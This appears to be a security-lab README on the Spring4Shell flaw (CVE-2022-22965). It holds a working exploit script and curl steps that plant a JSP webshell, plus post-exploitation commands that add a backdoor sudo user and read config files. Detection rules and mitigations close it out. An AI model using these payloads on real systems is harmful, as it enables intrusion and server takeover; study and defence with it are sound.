# Spring4Shell (CVE-2022-22965)

## Overview
Spring4Shell (also known as SpringShell) is a critical remote code execution vulnerability in Spring Framework. This lab demonstrates CVE-2022-22965 exploitation in a vulnerable Spring application.

## Quick Start

**Access URL**: http://localhost:8085

**Vulnerability**: Spring Framework RCE via Data Binding

**Affected Versions**: 
- Spring Framework 5.3.0 to 5.3.17
- Spring Framework 5.2.0 to 5.2.19
- Older unsupported versions

## Vulnerability Details

### The Vulnerability
Spring4Shell exploits class loader manipulation through data binding functionality. When certain conditions are met, attackers can modify Tomcat's logging properties to write a malicious JSP file.

### Prerequisites for Exploitation
1. JDK 9 or higher
2. Spring Framework (vulnerable versions)
3. Deployed as WAR on Apache Tomcat
4. Spring MVC with specific binding configurations

## Exploitation

### 1. Detection
```bash
# Check if vulnerable
curl -X POST http://localhost:8085/app/upload \
  -d "class.module.classLoader.resources.context.parent.pipeline.first.pattern=test"

# If no error, likely vulnerable
```

### 2. Automated Exploit Script
```python
#!/usr/bin/env python3
import requests
import sys

def exploit(url):
    headers = {
        "Content-Type": "application/x-www-form-urlencoded"
    }
    
    # Exploit parameters
    data = {
        "class.module.classLoader.resources.context.parent.pipeline.first.pattern": "%{c2}i if(\"j\".equals(request.getParameter(\"pwd\"))){ java.io.InputStream in = %{c1}i.getRuntime().exec(request.getParameter(\"cmd\")).getInputStream(); int a = -1; byte[] b = new byte[2048]; while((a=in.read(b))!=-1){ out.println(new String(b)); } } %{suffix}i",
        "class.module.classLoader.resources.context.parent.pipeline.first.suffix": ".jsp",
        "class.module.classLoader.resources.context.parent.pipeline.first.directory": "webapps/ROOT",
        "class.module.classLoader.resources.context.parent.pipeline.first.prefix": "shell",
        "class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat": ""
    }
    
    response = requests.post(url, data=data, headers=headers)
    print(f"[+] Exploit sent to {url}")
    print(f"[+] Check: {url}/shell.jsp?pwd=j&cmd=id")

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} <target_url>")
        sys.exit(1)
    
    exploit(sys.argv[1])
```

### 3. Manual Exploitation Steps
```bash
# Step 1: Set pattern
curl -X POST http://localhost:8085/vulnerable -d "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di"

# Step 2: Set suffix
curl -X POST http://localhost:8085/vulnerable -d "class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp"

# Step 3: Set directory
curl -X POST http://localhost:8085/vulnerable -d "class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT"

# Step 4: Set prefix
curl -X POST http://localhost:8085/vulnerable -d "class.module.classLoader.resources.context.parent.pipeline.first.prefix=shell"

# Step 5: Set fileDateFormat
curl -X POST http://localhost:8085/vulnerable -d "class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat="

# Step 6: Access webshell
curl "http://localhost:8085/shell.jsp?pwd=j&cmd=whoami"
```

## Understanding the Attack

### Attack Chain
1. **Access Tomcat's AccessLogValve** through Spring's parameter binding
2. **Modify logging configuration** to write malicious JSP files
3. **Control file location and content** through log patterns
4. **Execute commands** through the written JSP webshell

### Key Components
- `class.module.classLoader`: Access to class loader
- `resources.context.parent.pipeline.first`: Access to Tomcat's logging valve
- `pattern`: Content to write (our JSP code)
- `suffix`: File extension (.jsp)
- `directory`: Where to write the file
- `prefix`: Filename prefix

## Post-Exploitation

### 1. Establish Persistence
```bash
# Add backdoor user
curl "http://localhost:8085/shell.jsp?pwd=j&cmd=useradd -m -s /bin/bash hacker"

# Add to sudoers
curl "http://localhost:8085/shell.jsp?pwd=j&cmd=echo 'hacker ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers"
```

### 2. Data Exfiltration
```bash
# Find sensitive files
curl "http://localhost:8085/shell.jsp?pwd=j&cmd=find / -name '*.properties' 2>/dev/null"

# Read application properties
curl "http://localhost:8085/shell.jsp?pwd=j&cmd=cat /app/application.properties"
```

### 3. Lateral Movement
```bash
# Network discovery
curl "http://localhost:8085/shell.jsp?pwd=j&cmd=ifconfig"
curl "http://localhost:8085/shell.jsp?pwd=j&cmd=netstat -an"
```

## Indicators of Compromise

### Log Analysis
```bash
# Check for suspicious patterns in logs
grep -E "class\.|module\.|classLoader\." /var/log/tomcat*/catalina.out

# Look for created JSP files
find /var/lib/tomcat*/webapps -name "*.jsp" -mtime -7
```

### File System Artifacts
- Unexpected JSP files in webapps directories
- Modified access log configurations
- Unusual file prefixes/suffixes

## Mitigation

### 1. Immediate Actions
- Update Spring Framework to patched versions
- Apply vendor patches
- Implement WAF rules

### 2. Configuration Changes
```java
// Disable parameter binding for specific fields
@InitBinder
public void setAllowedFields(WebDataBinder dataBinder) {
    String[] denylist = new String[]{"class.*", "Class.*", "*.class.*", "*.Class.*"};
    dataBinder.setDisallowedFields(denylist);
}
```

### 3. Long-term Solutions
- Regular security updates
- Input validation
- Least privilege principles
- Security monitoring

## Detection Rules

### Snort/Suricata
```
alert http any any -> any any (msg:"Spring4Shell Exploitation Attempt"; content:"class.module.classLoader"; http_client_body; classtype:web-application-attack; sid:1000001; rev:1;)
```

### ModSecurity
```
SecRule REQUEST_BODY|ARGS|ARGS_NAMES "@rx (?:class\.|module\.|classLoader\.)" \
    "id:1000,\
    phase:2,\
    block,\
    msg:'Spring4Shell Exploitation Attempt',\
    logdata:'Matched Data: %{MATCHED_VAR} found within %{MATCHED_VAR_NAME}'"
```

## Learning Objectives
- Understanding Spring Framework data binding
- Class loader manipulation techniques
- WAR deployment vulnerabilities
- Log poisoning attacks
- Webshell deployment methods

## Additional Resources
- [Spring Security Advisory](https://spring.io/blog/2022/03/31/spring-framework-rce-early-announcement)
- [CVE-2022-22965 Details](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-22965)
- [Spring4Shell Analysis](https://www.lunasec.io/docs/blog/spring-rce-vulnerabilities/) 